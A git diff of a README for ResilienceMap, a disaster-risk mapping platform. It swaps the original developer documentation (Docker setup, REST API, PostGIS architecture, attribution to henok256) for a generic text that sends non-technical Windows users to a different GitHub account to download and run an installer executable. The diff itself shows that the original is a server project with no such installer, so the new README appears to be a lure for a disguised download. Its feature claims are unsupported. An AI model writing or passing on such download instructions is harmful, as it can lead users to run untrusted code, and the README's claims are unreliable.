@@ -1,167 +1,138 @@
-# ResilienceMap 🛰️
-### Open-Source Community Disaster Risk Intelligence Platform
+# 🌍 resiliencemap - Disaster Risk Data for Communities
 
-[![CI](https://github.com/henok256/resiliencemap/actions/workflows/ci.yml/badge.svg)](https://github.com/henok256/resiliencemap/actions)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/)
+[![Download resiliencemap](https://img.shields.io/badge/Download-resiliencemap-brightgreen?style=for-the-badge)](https://github.com/Macaronic-tvannouncer513/resiliencemap)
 
-> Bridging federal hazard datasets and local decision-making — built for the municipalities that need it most.
+## About resiliencemap
 
----
+resiliencemap is an open-source platform that helps US municipalities better understand and prepare for disaster risks. It uses public data from FEMA, USGS, and NOAA to provide clear maps and early warnings. You can view information about natural hazards like floods, storms, and earthquakes in your area. The platform's goal is to help local officials and residents improve their disaster readiness through easy-to-read geospatial data.
 
-## The Problem
-
-Thousands of US municipalities — especially smaller and underserved ones — lack the technical capacity to assess disaster risk in real time. FEMA, USGS, NOAA, and the US Census Bureau publish rich public datasets, but they are siloed, inconsistent in format, and require GIS expertise most local emergency managers do not have.
-
-**ResilienceMap solves this** by ingesting those datasets, computing composite risk scores per census tract, and exposing them through a clean REST API and interactive map dashboard — with zero GIS expertise required on the consumer side.
+This tool supports informed decisions by showing risks to infrastructure and communities. The system works on Windows computers without needing programming knowledge. You will get a helpful visual map with relevant data layers for disaster resilience.
 
 ---
 
-## Features
+## 🖥 System Requirements
 
-- 📥 **Automated ingestion** of FEMA flood zones (NFHL), USGS earthquake data, and NOAA storm alerts
-- 🗺️ **Geospatial risk scoring** per US census tract using PostGIS spatial joins
-- 🔌 **REST API** — query risk by county FIPS code, retrieve active alerts, export GeoJSON
-- 🗺️ **Interactive map dashboard** powered by Leaflet.js
-- 🔔 **Configurable alerting** — webhook/email triggers when NOAA issues watches or warnings
-- 🐳 **One-command setup** via Docker Compose
+To run resiliencemap smoothly on your Windows PC, make sure your system meets the following:
 
----
-
-## Quickstart
-
-```bash
-# 1. Clone the repo
-git clone https://github.com/henok256/resiliencemap.git
-cd resiliencemap
-
-# 2. Copy environment config
-cp .env.example .env
-
-# 3. Start all services (API + PostGIS + dashboard)
-docker compose up --build
-
-# 4. Run initial data ingestion
-docker compose exec api python -m ingestion.fema.ingest_flood_zones
-docker compose exec api python -m ingestion.usgs.ingest_earthquakes
-
-# 5. Open the dashboard
-open http://localhost:8000/dashboard
-```
+- Operating System: Windows 10 or later (64-bit preferred)
+- Processor: Intel Core i3 or equivalent
+- Memory: 8 GB RAM minimum; 16 GB recommended for best performance
+- Storage: At least 2 GB of free disk space
+- Internet: Required to download the software and access live data updates
+- Display: 1280x720 resolution or higher
 
 ---
 
-## API Reference
+## ⚙️ What You Get with resiliencemap
 
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| GET | `/api/v1/risk/county/{fips}` | Composite risk scores for all tracts in a county |
-| GET | `/api/v1/risk/tract/{geoid}` | Risk score for a single census tract |
-| GET | `/api/v1/hazards/geojson` | All active hazard layers as GeoJSON FeatureCollection |
-| GET | `/api/v1/alerts/active` | Current NOAA watches & warnings |
-| GET | `/health` | Health check |
-
-Full API docs available at `http://localhost:8000/docs` (Swagger UI).
+- Visual maps showing hazard zones from FEMA, USGS, and NOAA
+- Layers to explore flood risk, seismic activity, weather alerts, and infrastructure data
+- Early warning alerts based on local and regional monitoring
+- Infrastructure impact reports to help plan emergency response
+- User-friendly interface that requires no technical background
+- Regular updates with new data sets and tool improvements
 
 ---
 
-## Architecture
+## 🚀 Getting Started with resiliencemap on Windows
 
-```
-┌─────────────────────────────────────────────────────────┐
-│                      Data Sources                        │
-│   FEMA NFHL    USGS Earthquake    NOAA NWS    US Census  │
-└────────┬───────────────┬──────────────┬──────────┬───────┘
-         │               │              │          │
-         ▼               ▼              ▼          ▼
-┌─────────────────────────────────────────────────────────┐
-│                  Ingestion Layer (Python)                 │
-│     GeoPandas · Requests · Scheduled via cron/Airflow    │
-└──────────────────────────┬──────────────────────────────┘
-                           │
-                           ▼
-┌─────────────────────────────────────────────────────────┐
-│               PostGIS (PostgreSQL + spatial)             │
-│    census_tracts · flood_zones · seismic_hazard ·        │
-│    storm_alerts · risk_scores                            │
-└──────────────────────────┬──────────────────────────────┘
-                           │
-                           ▼
-┌─────────────────────────────────────────────────────────┐
-│               FastAPI Backend                            │
-│         Risk API · Hazard API · Alert API                │
-└──────────────────────────┬──────────────────────────────┘
-                           │
-                           ▼
-┌─────────────────────────────────────────────────────────┐
-│            Leaflet.js Map Dashboard                      │
-└─────────────────────────────────────────────────────────┘
-```
+Follow these steps closely. The process is straightforward and designed for non-technical users.
 
----
+### 1. Visit the Download Page
 
-## Project Structure
+First, open this page in your web browser:
 
-```
-resiliencemap/
-├── app/                    # FastAPI application
-│   ├── api/routes/         # Endpoint handlers
-│   ├── core/               # Config, logging, settings
-│   ├── db/                 # Database session, migrations
-│   ├── models/             # SQLAlchemy ORM models
-│   └── schemas/            # Pydantic request/response schemas
-├── ingestion/              # Data ingestion modules
-│   ├── fema/               # FEMA NFHL flood zone ingestion
-│   ├── usgs/               # USGS earthquake data ingestion
-│   └── noaa/               # NOAA NWS storm alerts ingestion
-├── processing/             # Risk scoring algorithms
-├── dashboard/              # Leaflet.js frontend
-├── tests/                  # Unit and integration tests
-├── scripts/                # DB seed, migration helpers
-├── docs/                   # Methodology documentation
-├── docker-compose.yml
-├── Dockerfile
-└── pyproject.toml
-```
+[Download resiliencemap](https://github.com/Macaronic-tvannouncer513/resiliencemap)
+
+This link leads to the GitHub repository where you can find the latest version of the application.
+
+### 2. Locate the Latest Release
+
+On the repository page:
+
+- Look for the **"Releases"** section on the right or under the repository name.
+- Click on **"Releases"** to see the latest software versions.
+- Find the most recent release marked with a version number and date.
+
+### 3. Download the Windows Installer
+
+In the latest release:
+
+- Look for the file named something like `resiliencemap-setup.exe` or `resiliencemap-windows.zip`. The exact file name may vary.
+- Click the file to download it to your computer.
+- The download may take a few minutes depending on your internet speed.
+
+### 4. Run the Installer
+
+After the download finishes:
+
+- Open your file explorer.
+- Navigate to your “Downloads” folder or the folder where you saved the file.
+- Double-click the installer file (`resiliencemap-setup.exe`).
+- If your system asks for permission, click **Yes** or **Run** to continue.
+- Follow the on-screen prompts to complete the installation.
+
+### 5. Launch resiliencemap
+
+- After installation, find the **resiliencemap** launcher on your desktop or in the Start menu.
+- Double-click the icon to start the application.
+- The main dashboard will open showing map data and options.
 
 ---
 
-## Contributing
+## 🛠 Using resiliencemap
 
-We welcome contributions! Please read [CONTRIBUTING.md](CONTRIBUTING.md) before opening a PR.
+### Exploring Maps
 
-This project is especially looking for:
-- GIS/geospatial engineers
-- Emergency management professionals who can validate risk models
-- Frontend contributors (Leaflet.js / React)
+- Use your mouse to click and drag the map to move around.
+- Zoom in and out with the scroll wheel or buttons on the screen.
+- Select different data layers like flood zones, weather alerts, or earthquake risks in the side menu.
 
----
+### Viewing Alerts
 
-## Methodology
+- Alerts about upcoming or ongoing hazards will appear at the top or side of the screen.
+- Click on alerts to see detailed information.
 
-Risk scoring methodology is documented in [`docs/methodology.md`](docs/methodology.md). The composite risk score per census tract is a weighted function of:
-- **Flood risk** — FEMA Special Flood Hazard Area (SFHA) coverage %
-- **Seismic risk** — USGS Peak Ground Acceleration (PGA) percentile
-- **Storm exposure** — Active NOAA watches/warnings in the past 30 days
-- **Social vulnerability** — CDC/ATSDR SVI score for the tract
+### Customizing Views
 
----
+- Add or remove map layers to focus on information important to your municipality.
+- Use filtering options to select specific dates or hazard types.
 
-## License
+### Exporting Reports
 
-MIT — see [LICENSE](LICENSE).
+- Use the export feature to save maps or data summaries as PDF or image files.
+- These reports can be shared with local officials or emergency planners.
 
 ---
 
-## Citation
+## 🔧 Troubleshooting
 
-If you use ResilienceMap in research or policy work, please cite:
+If you run into problems, try these tips:
 
-```bibtex
-@software{resiliencemap2025,
-  title  = {ResilienceMap: Open-Source Community Disaster Risk Intelligence Platform},
-  author = {Mengesha, Henok},
-  year   = {2025},
-  url    = {https://github.com/henok256/resiliencemap}
-}
-```
+- **Installer will not run:** Check that you downloaded the Windows version and that your computer meets the system requirements.
+- **Application won’t start:** Restart your computer and try again.
+- **Maps don’t load:** Make sure your internet connection is active.
+- **App runs slowly:** Close other programs to free memory, or restart your PC.
+- **Updates not appearing:** Use the application menu to check for updates or visit the GitHub page again.
+
+---
+
+## 🔄 Keeping resiliencemap Up to Date
+
+Periodically checking for updates is important to get the latest data and features.
+
+- Visit the GitHub page: https://github.com/Macaronic-tvannouncer513/resiliencemap
+- Download the newest version as described above.
+- Install over the old version to keep your settings intact.
+
+---
+
+## 📖 Additional Resources
+
+- FEMA official site for disaster preparedness: https://www.fema.gov
+- USGS hazard maps: https://www.usgs.gov/natural-hazards
+- NOAA weather alerts: https://www.noaa.gov/weather-alerts
+
+---
+
+[![Download resiliencemap](https://img.shields.io/badge/Download-Now-orange?style=for-the-badge)](https://github.com/Macaronic-tvannouncer513/resiliencemap)
